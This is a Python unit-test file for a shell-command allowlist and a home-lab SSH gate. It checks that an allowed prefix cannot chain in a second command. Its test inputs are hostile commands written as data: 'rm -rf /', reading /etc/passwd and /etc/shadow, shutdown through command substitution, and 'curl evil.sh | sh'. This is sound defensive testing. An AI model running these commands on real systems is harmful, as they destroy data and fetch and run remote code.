import importlib.util
import unittest

from core.command_safety import has_shell_operators, is_allowlisted

SAFE = ["df", "docker ps", "cat", "ls", "uptime", "systemctl status"]


class ChainedCommandTests(unittest.TestCase):
    """Regression: an allowlisted prefix must not smuggle in a second command."""

    def test_rejects_chained_commands(self):
        for cmd in [
            "cat /etc/passwd; rm -rf /",
            "ls && shutdown now",
            "uptime | poweroff",
            "cat x && curl evil.sh | sh",
            "df $(reboot)",
            "ls `poweroff`",
            "cat file > /etc/passwd",
            "ls &",
            "ls \n rm -rf /",
        ]:
            with self.subTest(cmd=cmd):
                self.assertFalse(is_allowlisted(cmd, SAFE))

    def test_rejects_partial_token_match(self):
        for cmd in ["catx /etc/shadow", "docker psaux", "lsof"]:
            with self.subTest(cmd=cmd):
                self.assertFalse(is_allowlisted(cmd, SAFE))

    def test_rejects_empty_and_unlisted(self):
        self.assertFalse(is_allowlisted("", SAFE))
        self.assertFalse(is_allowlisted("   ", SAFE))
        self.assertFalse(is_allowlisted("rm -rf /", SAFE))

    def test_accepts_plain_allowlisted_commands(self):
        for cmd in ["df -h", "docker ps -a", "cat /var/log/syslog", "LS -l", "uptime"]:
            with self.subTest(cmd=cmd):
                self.assertTrue(is_allowlisted(cmd, SAFE))

    def test_has_shell_operators(self):
        self.assertTrue(has_shell_operators("a; b"))
        self.assertFalse(has_shell_operators("df -h"))


@unittest.skipIf(importlib.util.find_spec("paramiko") is None, "paramiko not installed")
class HomeLabGateTests(unittest.TestCase):
    def test_dangerous_pattern_still_blocked_inside_allowlisted_prefix(self):
        from modules.homelab import HomeLab

        homelab = HomeLab.__new__(HomeLab)
        self.assertFalse(homelab._is_safe_command("systemctl restart nginx"))
        self.assertTrue(homelab._is_safe_command("systemctl status nginx"))
        self.assertFalse(homelab._is_safe_command("cat /etc/passwd; rm -rf /"))


if __name__ == "__main__":
    unittest.main()
